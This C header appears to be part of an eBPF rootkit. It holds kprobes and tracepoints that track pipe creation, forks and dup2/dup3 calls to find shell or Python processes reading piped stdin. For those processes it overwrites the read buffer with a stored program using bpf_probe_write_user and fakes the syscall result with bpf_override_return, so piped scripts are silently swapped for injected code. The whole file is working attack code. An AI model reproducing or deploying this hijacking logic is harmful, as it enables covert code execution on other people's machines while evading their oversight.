/* SPDX-License-Identifier: GPL-2.0 WITH Linux-syscall-note */
/* Copyright (c) 2020
 *
 * This program is free software; you can redistribute it and/or
 * modify it under the terms of version 2 of the GNU General Public
 * License as published by the Free Software Foundation.
 */
#ifndef _PIPE_H_
#define _PIPE_H_

struct bpf_map_def SEC("maps/pid_pipe_token") pid_pipe_token = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_pipe() {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    u32 pipe_token = bpf_get_prandom_u32();
    bpf_map_update_elem(&pid_pipe_token, &tgid, &pipe_token, BPF_ANY);
    return 0;
}

SYSCALL_KPROBE0(pipe) {
    return handle_pipe();
}

SYSCALL_KPROBE0(pipe2) {
    return handle_pipe();
}

struct _tracepoint_sched_process_fork
{
    unsigned short common_type;
    unsigned char common_flags;
    unsigned char common_preempt_count;
    int common_pid;

    char parent_comm[16];
    pid_t parent_pid;
    char child_comm[16];
    pid_t child_pid;
};

SEC("tracepoint/sched/sched_process_fork")
int sched_process_fork(struct _tracepoint_sched_process_fork *args) {
    u32 ppid = bpf_get_current_pid_tgid() >> 32;
    u32 child_pid = 0;
    bpf_probe_read(&child_pid, sizeof(child_pid), &args->child_pid);

    // copy pipe token from parent to child if there is one
    u32 *token = bpf_map_lookup_elem(&pid_pipe_token, &ppid);
    if (token == NULL)
        return 0;

    bpf_map_update_elem(&pid_pipe_token, &child_pid, token, BPF_ANY);
    return 0;
}

struct piped_stdin_t {
    u32 prog_key;
    u32 cursor;
};

struct bpf_map_def SEC("maps/pid_with_piped_stdin") pid_with_piped_stdin = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = sizeof(struct piped_stdin_t),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_dup(int oldfd, int newfd) {
    u32 pid = bpf_get_current_pid_tgid() >> 32;
    u32 *token = bpf_map_lookup_elem(&pid_pipe_token, &pid);
    if (token == NULL)
        return 0;

    // we only care about the receiving end of the pipe
    if (newfd != 0)
        return 0;

    // mark stdin as piped for active pid
    struct piped_stdin_t val = {};
    bpf_map_update_elem(&pid_with_piped_stdin, &pid, &val, BPF_ANY);
    return 0;
}

SYSCALL_KPROBE2(dup2, int, oldfd, int, newfd) {
    return handle_dup(oldfd, newfd);
}

SYSCALL_KPROBE2(dup3, int, oldfd, int, newfd) {
    return handle_dup(oldfd, newfd);
}

SEC("kprobe/do_exit")
int kprobe_do_exit(struct pt_regs *ctx) {
    u64 pid_tgid = bpf_get_current_pid_tgid();
    u32 tgid = pid_tgid >> 32;
    u32 pid = pid_tgid;

    if (tgid == pid) {
        bpf_map_delete_elem(&pid_pipe_token, &tgid);
        bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
    }

    return 0;
}

#define PIPE_OVERRIDE_PYTHON_KEY 1
#define PIPE_OVERRIDE_SHELL_KEY  2

struct bpf_map_def SEC("maps/comm_prog_key") comm_prog_key = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = 16,
    .value_size = sizeof(u32),
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

struct bpf_map_def SEC("maps/piped_progs") piped_progs = {
    .type = BPF_MAP_TYPE_LRU_HASH,
    .key_size = sizeof(u32),
    .value_size = HTTP_REQ_LEN,
    .max_entries = 1024,
    .pinning = 0,
    .namespace = "",
};

__attribute__((always_inline)) int handle_stdin_read(struct pt_regs *ctx, void *buf) {
    u32 tgid = bpf_get_current_pid_tgid() >> 32;
    struct piped_stdin_t *piped_stdin = bpf_map_lookup_elem(&pid_with_piped_stdin, &tgid);
    if (piped_stdin == NULL)
        return 0;

    if (piped_stdin->prog_key == 0) {
        // check if the receiver of the pipe is one of the program we care about
        char comm[16];
        bpf_get_current_comm(&comm, sizeof(comm));

        u32 *prog_key = bpf_map_lookup_elem(&comm_prog_key, comm);
        if (prog_key == 0) {
            // we don't care about this program, delete pid_with_piped_stdin entry
            bpf_map_delete_elem(&pid_with_piped_stdin, &tgid);
            return 0;
        }
        piped_stdin->prog_key = *prog_key;
    }

    void *prog = bpf_map_lookup_elem(&piped_progs, &piped_stdin->prog_key);
    if (prog == NULL)
        return 0;

    char c = 0;
    if (piped_stdin->cursor > HTTP_REQ_LEN)
        return 0;

    bpf_probe_read(&c, sizeof(c), (void*)prog + piped_stdin->cursor);
    if (c == 0) {
        bpf_probe_write_user(buf, &c, 1);
        bpf_override_return(ctx, 0);
        return 0;
    }

    bpf_probe_write_user(buf, &c, 1);
    piped_stdin->cursor += 1;
    bpf_override_return(ctx, 1);

//    bpf_printk("(+%d) %s\n", piped_stdin->cursor, buf);
    return 0;
}

#endif
